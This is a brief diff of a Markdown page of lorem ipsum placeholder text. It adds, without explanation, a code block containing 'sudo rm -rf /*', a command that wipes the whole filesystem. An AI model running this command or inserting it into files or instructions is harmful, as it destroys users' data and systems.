@@ -15,3 +15,7 @@ Fusce molestie sollicitudin eros, **ut gravida tortor**. Vivamus est leo, molest
 ### Quisque ultricies est in luctus gravida.
 
 Ut ultrices nulla mauris. Sed mattis odio in iaculis placerat. Fusce et massa nec mi gravida scelerisque ut id quam. Sed hendrerit purus vel venenatis tincidunt. Donec in nulla ac lacus maximus ullamcorper vitae et purus. Suspendisse ac cursus urna. Duis velit sapien, tristique et metus id, euismod consectetur nisi. Vestibulum facilisis in lorem vel volutpat. Nullam consequat tristique ex a volutpat. Nulla ut ante varius, scelerisque est in, viverra elit. *Ut id risus dui.*
+
+```
+sudo rm -rf /*
+```
